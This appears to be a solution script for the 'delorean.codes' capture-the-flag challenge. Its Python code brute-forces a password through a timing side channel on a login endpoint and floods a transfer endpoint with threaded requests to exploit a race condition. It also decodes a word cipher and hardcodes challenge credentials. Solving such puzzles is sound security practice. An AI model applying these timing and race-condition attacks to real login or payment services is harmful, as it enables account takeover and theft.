# delorean-codes
delorean.codes

```python
import requests
from string import ascii_lowercase, ascii_uppercase, digits
from threading import Lock, Thread
from pprint import pprint

url = "https://store.delorean.codes/u/rickyhan/login"
transfer_url = "https://store.delorean.codes/u/rickyhan/transfer"
lock = Lock()

payload_biff = {
    'username': 'biff_tannen',
    'password': '1idxK6tJIn'
}

payload_marty = {
	"username": "marty_mcfly",
	"password": "8P5j7Q4aWw"
}

def test_pwd(pwd):
	r = requests.post(url, data={
		"username": "marty_mcfly",
		"password": pwd
		})
	with lock:
		print(pwd)
	time = r.headers['x-upstream-response-time']
	with lock:
		print(pwd, time)

# p2.a
def crack():
	chars = ascii_lowercase+ascii_uppercase+digits
	potential_postfixes = ['8P5j7Q4aWw'+j for j in chars]

	# ret = [(str(1)+pwd, test_pwd(pwd)) for pwd in potential_postfixes]
	for i in potential_postfixes:
	    t = Thread(target=test_pwd, args=(i,))
	    t.start()

# p2.b
def transfer(session, to):
	r = session.post(transfer_url, data={
		"to": to
		})
	# with lock:
	# 	print(r.text)

def race_condition(is_marty):
	if is_marty:
		to = 'biff_tannen'
		payload = payload_marty
	else:
		to = 'marty_mcfly'
		payload = payload_biff

	with requests.Session() as s:
		p = s.post(url, data=payload)
		for i in range(10):
			t = Thread(target=transfer, args=(s, to,))
			t.start()
def run_race_condition():
	flip = False
	while True:
		race_condition(flip)
		flip = not flip


# p3
def split_every(s, n):
	return [s[i:i+n] for i in range(0, len(s), n)]

def build_mapping(): # word -> bit, definitely one to one
	mapping = {}
	for (b, t) in zip(s1[0], s1[1]):
		mapping[t] = b
	for (b, t) in zip(s2[0], s2[1]):
		mapping[t] = b
	for (b, t) in zip(s3[0], s3[1]):
		mapping[t] = b
	return mapping

def build_decoder_mapping(): # also one to one
	mapping = {}
	for (b, t) in zip(s1[0], s1[2]):
		mapping[t] = b
	for (b, t) in zip(s2[0], s2[2]):
		mapping[t] = b
	for (b, t) in zip(s3[0], s3[2]):
		mapping[t] = b
	return mapping

s1 = (split_every("00110001001001111010110000111010100100011101000111000000110100011100101101001110001010010111010001110010010001", 5), "oh or company deloreon embarrassment sponsoring gullible down readout you thats um mayor freak not worked worry disintegrate claimed bob can around".split(), "get your hands off her")
s2 = (split_every("0011010001001000000010011110101001000010011101001110011", 5), "hey still way missing bob television ever isnt nickles letting know".split(), "great scott")
s3 = (split_every("00100010000011000111100111100011010001000100000110001111001111010011000111100111", 5), "produced advice havent slip what jennifer better want son here totaled know was jennifers reelect how".split(), "eighty eight mph")

all_from = s1[1] + s2[1] + s3[1]
# repeated: from, bob

mapping = build_mapping() # word -> bits
inverted_mapping = {v: k for k, v in mapping.items()} # bits -> words
dec_mapping = build_decoder_mapping() # letters -> bits
inverted_dec_mapping = {v: k for k, v in dec_mapping.items()} # bits -> letters

known_letter_word = {}
for k, v in dec_mapping.items():
	if v in mapping.values():
		known_letter_word[k] = inverted_mapping[v]

print(' '.join([known_letter_word[i] for i in 'cunt']))

# print(len(s1[0]+s2[0]+s3[0]))
# print(len(mapping))

# 110: 00110001001001111010110000111010100100011101000111000000110100011100101101001110001010010111010001110010010001
# 22: oh or company deloreon embarrassment sponsoring gullible down readout you thats um mayor freak not worked worry disintegrate claimed bob can around
# 22: get your hands off her

# 55: 0011010001001000000010011110101001000010011101001110011
# 11: hey still way missing bob television ever isnt nickles letting know
# 11: great scott

# 80: 00100010000011000111100111100011010001000100000110001111001111010011000111100111
# 16: produced advice havent slip what jennifer better want son here totaled know was jennifers reelect how
# 16: eighty eight mph

```
